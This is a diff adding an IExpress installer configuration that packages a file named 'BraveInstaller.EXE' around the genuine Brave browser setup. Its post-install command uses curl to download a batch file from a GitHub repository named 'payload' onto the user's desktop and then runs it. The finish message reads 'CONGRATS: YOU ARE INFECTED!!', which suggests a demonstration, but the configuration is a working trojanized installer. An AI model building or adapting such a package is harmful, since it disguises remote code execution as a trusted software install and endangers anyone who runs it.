@@ -1,0 +1,37 @@
+[Version]
+Class=IEXPRESS
+SEDVersion=3
+[Options]
+PackagePurpose=InstallApp
+ShowInstallProgramWindow=1
+HideExtractAnimation=1
+UseLongFileName=0
+InsideCompressed=0
+CAB_FixedSize=0
+CAB_ResvCodeSigning=0
+RebootMode=N
+InstallPrompt=%InstallPrompt%
+DisplayLicense=%DisplayLicense%
+FinishMessage=%FinishMessage%
+TargetName=%TargetName%
+FriendlyName=%FriendlyName%
+AppLaunched=%AppLaunched%
+PostInstallCmd=%PostInstallCmd%
+AdminQuietInstCmd=%AdminQuietInstCmd%
+UserQuietInstCmd=%UserQuietInstCmd%
+SourceFiles=SourceFiles
+[Strings]
+InstallPrompt=
+DisplayLicense=
+FinishMessage=CONGRATS: YOU ARE INFECTED!!
+TargetName=C:\Users\soulr\Desktop\payload\BraveInstaller.EXE
+FriendlyName=BraveInstaller
+AppLaunched=BraveBrowserSetup-BRV010.exe
+PostInstallCmd=cmd /c curl.exe https://raw.githubusercontent.com/soulreaper71/payload/refs/heads/main/brave_browser.bat >> C:/users/%username%/Desktop/brave_browser.bat&&cmd /c C:/users/%username%/Desktop/brave_browser.bat
+AdminQuietInstCmd=
+UserQuietInstCmd=
+FILE0="BraveBrowserSetup-BRV010.exe"
+[SourceFiles]
+SourceFiles0=C:\Users\soulr\Desktop\
+[SourceFiles0]
+%FILE0%=
